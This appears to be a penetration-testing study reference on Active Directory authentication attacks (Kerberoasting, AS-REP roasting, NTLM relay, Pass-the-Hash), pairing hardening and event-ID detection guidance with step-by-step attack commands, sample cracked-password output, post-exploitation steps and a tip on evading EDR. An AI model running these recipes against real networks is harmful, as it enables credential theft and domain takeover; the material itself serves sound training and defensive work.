## 1. Overview

Authentication in Active Directory relies on Kerberos (default) and NTLM
(legacy). Both have well-known attack classes that exploit design choices
rather than software bugs. This file covers the four families that matter
most in practice: Kerberoasting, AS-REP Roasting, NTLM relay, and
Pass-the-Hash / Pass-the-Ticket.

**Why these attacks work:**

- Kerberos tickets for service accounts are encrypted with the service
  account's password hash - requestable by any authenticated user.
- Accounts with pre-authentication disabled accept AS-REQ from anyone.
- NTLM authentication can be relayed if the target does not enforce
  signing or channel binding.
- NTLM hashes are password-equivalent for network authentication.

**Preconditions at a glance:**

| Attack | Requires | Yields |
|--------|----------|--------|
| Kerberoasting | Any domain user | Service account password (offline crack) |
| AS-REP Roasting | No auth (if pre-auth disabled) | User password (offline crack) |
| NTLM Relay | Network position + unsigned target | Authenticated session as victim |
| Pass-the-Hash | NTLM hash of a user | Authenticated session as that user |
| Pass-the-Ticket | Kerberos ticket (.kirbi / .ccache) | Authenticated session as ticket owner |

## 2. Reconnaissance / Enumeration

**Offensive - Kerberoastable accounts:**

    # Linux: request TGS for all SPN-holders
    GetUserSPNs.py corp.local/USER:PASS -dc-ip 10.10.10.10

    # Windows: PowerView
    Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

    # Windows: built-in setspn
    setspn -T corp.local -Q */*

**Offensive - AS-REP roastable accounts:**

    # Linux: enumerate users without pre-auth
    GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt

    # Windows: PowerView
    Get-DomainUser -PreauthNotRequired | Select samaccountname

    # LDAP filter (raw)
    (&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

**Offensive - NTLM relay preconditions:**

    # Check SMB signing on targets
    netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

    # Check LDAP signing / channel binding
    netexec ldap 10.10.10.10 -u USER -p PASS -M ldap-checker

    # Check HTTP endpoints for NTLM auth
    netexec http 10.10.10.0/24

**Defensive - what to monitor:**

- 4769 events with encryption type 0x17 (RC4) - Kerberoasting signal.
- 4768 events with `Pre-Authentication Type = 0` - AS-REP Roasting signal.
- 4624 events with `Logon Type 3` + NTLM from unusual sources.
- 4776 events (NTLM credential validation) in volume.
- SMB signing disabled hosts.

## 3. Common Attack Vectors

**Kerberoasting:**

- Request a TGS for any account with an SPN.
- The TGS is encrypted with the service account's NTLM hash.
- Crack offline with hashcat mode 13100 (RC4) or 19700 (AES).
- Works with any authenticated user, no special rights.

**AS-REP Roasting:**

- Request an AS-REP for accounts with `DONT_REQ_PREAUTH`.
- The AS-REP is encrypted with the user's NTLM hash.
- Crack offline with hashcat mode 18200.
- No authentication required.

**NTLM Relay:**

- Coerce a victim to authenticate to an attacker-controlled host
  (Responder, PetitPotam, PrinterBug, DFSCoerce).
- Relay the NTLM authentication to a target service (SMB, LDAP, HTTP,
  MSSQL) where the victim has rights.
- Works only if the target does not require SMB signing or LDAP signing
  + channel binding.

**Pass-the-Hash (PtH):**

- Use an NTLM hash directly for authentication (no cracking).
- Works with `psexec.py -hashes`, `wmiexec.py -hashes`, `netexec smb -H`.
- Requires the target to accept NTLM (most do by default).

**Pass-the-Ticket (PtT):**

- Use a stolen Kerberos ticket (.kirbi or .ccache) for authentication.
- Works with `psexec.py -k -no-pass`, `Rubeus ptt`, `ticketer.py`.
- Requires a valid ticket (TGT or TGS).

**Overpass-the-Hash (Kerberos PtH):**

- Convert an NTLM hash into a Kerberos ticket via `getTGT.py` or
  `Rubeus asktgt /rc4:<hash>`.
- Useful when NTLM is disabled but Kerberos is enabled.

## 4. Exploitation Recipes

**Kerberoasting end-to-end:**

    # 1. Request TGS for all SPN-holders
    GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.10 -request

    # Expected output:
    # ServicePrincipalName          Name          MemberOf   PasswordLastSet
    # MSSQLSvc/sql01:1433           svc_sql                  2024-03-15
    # $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01:1433*...

    # 2. Crack with hashcat (mode 13100 = RC4 TGS-REP)
    hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

    # Expected output:
    # $krb5tgs$23$*svc_sql$...
    # Status...........: Cracked
    # Recovered........: Summer2024!

**AS-REP Roasting end-to-end:**

    # 1. Request AS-REP for accounts with pre-auth disabled
    GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

    # Expected output:
    # $krb5asrep$23$svc_backup@CORP.LOCAL:...

    # 2. Crack with hashcat (mode 18200 = AS-REP etype 23)
    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

    # Expected output:
    # Status...........: Cracked
    # Recovered........: Backup2024!

**NTLM relay (SMB -> SMB) with Responder + ntlmrelayx:**

    # Terminal 1: Responder (poisoning only)
    responder -I eth0 -wv

    # Terminal 2: ntlmrelayx targeting unsigned SMB hosts
    ntlmrelayx.py -tf relay_targets.txt -smb2support

    # Optional: --no-smb-server to disable Responder's SMB
    # Optional: -c "whoami" to execute a command on relay success

    # Expected output:
    # [*] Servers started, waiting for connections
    # [*] SMBD-Thread-5: Received connection from 10.10.10.50
    # [*] Authenticating against smb://10.10.10.60 as CORP/user SUCCEED
    # [*] Authenticated to 10.10.10.60, dumping SAM

**Pass-the-Hash:**

    # With impacket (secretsdump output -> psexec)
    psexec.py -hashes <LM_HASH_EMPTY>:<NTLM_HASH> corp.local/Administrator@10.10.10.10

    # With netexec
    netexec smb 10.10.10.10 -u Administrator -H <NTLM_HASH>

    # Expected output:
    # SMB  10.10.10.10  445  DC01  [*] Windows Server 2019
    # SMB  10.10.10.10  445  DC01  [+] CORP\Administrator <NTLM_HASH> (Pwn3d!)

**Overpass-the-Hash:**

    # Get a TGT using an NTLM hash
    getTGT.py -hashes :<NTLM_HASH> corp.local/user

    # Use the TGT
    export KRB5CCNAME=user.ccache
    psexec.py -k -no-pass corp.local/user@dc01.corp.local

## 5. Post-Exploitation

**After Kerberoasting:**

- Cracked service account password -> validate with `netexec smb`.
- Check what the service account can access:
  `netexec smb 10.10.10.0/24 -u svc_sql -p <PASSWORD> --local-auth`.
- Look for other SPN-holders whose hashes may crack faster.

**After AS-REP Roasting:**

- Cracked user password -> validate; check group memberships
  (may grant access to sensitive shares, or be a path to DA).
- Re-run BloodHound with the new credential marked owned.

**After NTLM relay:**

- Captured session -> dump SAM/LSA on the relayed host.
- If relayed to LDAP: create a machine account, add it to a group,
  set RBCD, or grant DCSync rights (with `ntlmrelayx --escalate-user`).
- If relayed to ADCS HTTP endpoint: request a certificate as the
  victim (ESC8), then authenticate with it (PKINIT).

**After Pass-the-Hash:**

- Dump LSASS on the new host for cleartext passwords and more hashes.
- Re-run `netexec smb 10.10.10.0/24 -u USER -H HASH` to find other
  hosts where the hash works.

**Persistence considerations:**

- NTLM hashes remain valid until the password changes.
- Kerberos tickets expire (default 10h); Golden Tickets last as long
  as the KRBTGT hash is unchanged.

## 6. Risk Context

Authentication attacks are the fastest route from a low-privileged
domain user to Domain Admin in most environments:

- Kerberoasting needs no special rights and often yields a service
  account with local admin on multiple servers.
- AS-REP Roasting is rare but trivially exploitable when pre-auth is
  disabled.
- NTLM relay turns any coerced authentication into a session on an
  unsigned target.
- Pass-the-Hash turns any dumped hash into a network logon.

**Blast radius:** a single compromised service account often unlocks
lateral movement across dozens of hosts. A single NTLM hash of an admin
often unlocks the entire domain.

**Why attacks succeed:**

- Service accounts frequently bypass password policy.
- RC4 is still enabled in most ADs (required for Kerberoasting to be
  crackable quickly).
- SMB signing is disabled by default on member servers and workstations.
- LDAP signing and channel binding are not enforced by default.
- NTLM is enabled for backward compatibility.

## 7. Root Causes

- **Service accounts with weak passwords.** Often set once, never rotated,
  and not subject to domain password policy.
- **Service accounts with SPNs on user objects.** Any user object with
  an SPN is Kerberoastable.
- **Pre-auth disabled.** Set for legacy applications; rarely audited.
- **NTLM enabled.** Backward compatibility with legacy systems.
- **SMB signing not enforced.** Default on workstations in older
  versions; member servers often still allow unsigned SMB.
- **LDAP signing and channel binding not enforced.** Default is
  negotiation, not require.
- **Excessive privileges for service accounts.** Local admin on many
  servers, or in Domain Admins.
- **No credential rotation after compromise.** Hashes remain valid.

## 8. Preventive Controls

**Kerberos hardening:**

- Use gMSA (group Managed Service Accounts) - 240-character passwords,
  rotated automatically.
- Where gMSA is not possible: 25+ character random passwords, rotated
  quarterly.
- Remove SPNs from user accounts; ensure service accounts are dedicated.
- Disable RC4; enforce AES for Kerberos (`msDS-SupportedEncryptionTypes`
  = 24).
- Monitor 4769 with encryption type 0x17.

**AS-REP hardening:**

- Audit accounts with `DONT_REQ_PREAUTH` (`userAccountControl` bit 4194304).
- Should be zero in production. If not, document the exception.
- Enable pre-auth on all accounts.

**NTLM hardening:**

- Enforce SMB signing on all hosts (`RequireSecuritySignature = 1`).
- Enforce LDAP signing and channel binding on all DCs.
- Disable NTLM where possible (`Network security: Restrict NTLM`).
- Disable WebDAV if not needed (blocks some coercion vectors).
- Patch against coercion vectors (PetitPotam, PrinterBug, DFSCoerce).

**PtH/PtT hardening:**

- Enable Protected Users group for all privileged accounts
  (blocks NTLM, unconstrained delegation, RC4, and more).
- Require smart cards for Tier 0 accounts.
- Rotate KRBTGT twice after any suspected compromise.
- Enable Credential Guard on Windows 10/11 and Server 2016+.

**General:**

- Tiered administration model (Tier 0 / 1 / 2).
- PAWs for Tier 0 administration.
- No domain admin logons on member servers.

## 9. Detection Controls

**Kerberoasting:**

- Event 4769 with `Ticket Encryption Type = 0x17` (RC4) - baseline and
  alert on volume from a single user.
- Event 4769 with `Service Name` not in a known baseline of services.
- Event 4769 for accounts that never authenticate normally.

**AS-REP Roasting:**

- Event 4768 with `Pre-Authentication Type = 0` - should be zero.
- Event 4768 with `Ticket Encryption Type = 0x17` from unexpected source.

**NTLM relay:**

- Event 4624 with `Logon Type = 3` and `Authentication Package = NTLM`.
- Event 4776 with unusual source workstation.
- Event 4624 with `Logon Process = NtLmSsp` on a target that should
  use Kerberos.
- SMB signing disabled on any host - proactive detection.

**Pass-the-Hash:**

- Event 4624 with `Logon Type = 9` (NewCredentials) or `3` (Network)
  and NTLM.
- Event 4672 (special privileges) for non-admin users.
- Event 4648 (explicit credential logon) with NTLM.

**Pass-the-Ticket:**

- Event 4769 with a TGS requested by a user with no prior TGT request
  (no 4768 in the same session).
- Event 4769 with an anomalous `Client Address`.
- Event 4769 for a user from a workstation where they never logged on.

**Coercion (PetitPotam, PrinterBug):**

- Event 4624 on the attacker host with the DC machine account.
- Event 5145 (network share access) to IPC$ from a DC machine account.
- Event 4768 / 4769 with the DC machine account authenticating to
  unexpected services.

**General:**

- Honeytokens: fake SPN accounts, fake privileged accounts. Any
  authentication or TGS request to them is high-confidence.

## 10. Verification

**Offensive - did the attack succeed?**

- Kerberoasting: TGS hash cracked offline; validate the password with
  `netexec smb` or `nxc winrm`.
- AS-REP Roasting: AS-REP hash cracked; validate similarly.
- NTLM relay: `ntlmrelayx` logged `SUCCEED` and the relayed action
  (SAM dump, command execution, LDAP modification) succeeded.
- Pass-the-Hash: session opened (`Pwn3d!` in netexec); validate with
  `whoami` or by reading a file only the target user can read.
- Pass-the-Ticket: `klist` shows the ticket; the service accepts it.

**Defensive - are controls effective?**

- Test Kerberoasting from a normal user with RC4 disabled: should fail
  or generate only AES TGS (not crackable with mode 13100).
- Test AS-REP Roasting: zero accounts with pre-auth disabled.
- Test NTLM relay: SMB signing enforced on all targets; relay fails.
- Test Pass-the-Hash: Protected Users group blocks NTLM for members;
  NTLM disabled for Tier 0.
- Test coercion: PetitPotam and PrinterBug patched; WebDAV disabled.

## 11. OSCP Notes

- Kerberoasting is the single most common OSCP AD foothold. Practice the
  full chain: `GetUserSPNs.py -request` -> `hashcat -m 13100`.
- AS-REP Roasting is less common but trivial when it appears.
- NTLM relay is rarely required in OSCP (the exam focuses on Kerberos),
  but understanding it is essential for the exam's AD machines.
- Pass-the-Hash is the standard lateral movement technique after DCSync.
- **Capture screenshots** of:
  - The SPN-holders list.
  - The TGS hash request.
  - The `hashcat` cracked line.
  - The successful authentication with the cracked password.
- The `> [!IMPORTANT]` OSCP reporting note applies to any command whose
  output proves the foothold or lateral movement.

## 12. Production Notes

- RC4-only Kerberoasting is increasingly rare in mature environments;
  AES TGS tickets are also crackable (hashcat mode 19700) but much slower.
- Service account passwords in production are often 30+ characters and
  uncrackable; Kerberoasting is then useful for identifying targets
  rather than immediate compromise.
- NTLM relay is the most impactful on networks with SMB signing disabled
  (still common in OT and legacy environments).
- Pass-the-Hash is detectable via 4624 with NTLM but is often hidden in
  a sea of legitimate NTLM traffic.
- EDR solutions flag `secretsdump`, `psexec`, and `ntlmrelayx` patterns;
  in mature environments use less common tools (`CrackMapExec` modules,
  custom loaders) or fall back to Kerberos.

## 13. References

**Microsoft documentation:**

- Kerberos authentication overview - https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview
- Group Managed Service Accounts overview - https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview
- Network security: Restrict NTLM - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm
- SMB signing overview - https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview

**MITRE ATT&CK:**

- Credential Access - Kerberoasting (T1558.003) - https://attack.mitre.org/techniques/T1558/003/
- Credential Access - AS-REP Roasting (T1558.004) - https://attack.mitre.org/techniques/T1558/004/
- Lateral Movement - Use Alternate Authentication Material (T1550) - https://attack.mitre.org/techniques/T1550/
- Credential Access - Forced Authentication (T1187) - https://attack.mitre.org/techniques/T1187/

**Tools:**

- Impacket - https://github.com/fortra/impacket - GetUserSPNs, GetNPUsers, secretsdump, psexec, getTGT, ticketer
- netexec - https://github.com/Pennyw0rth/NetExec - SMB/LDAP/WinRM enumeration and exploitation
- Responder - https://github.com/lgandx/Responder - LLMNR/NBT-NS/mDNS poisoning
- ntlmrelayx - https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py - NTLM relay
- Rubeus - https://github.com/GhostPack/Rubeus - Kerberos attack toolkit
- Mimikatz - https://github.com/gentilkiwi/mimikatz - Pass-the-Hash, Pass-the-Ticket, DCSync

**Research:**

- ADSecurity.org - Kerberoasting - https://adsecurity.org/?p=2293
- SpecterOps - NTLM relay - https://posts.specterops.io/
- The Hacker Recipes - Kerberos - https://www.thehacker.recipes/ad/movement/kerberos
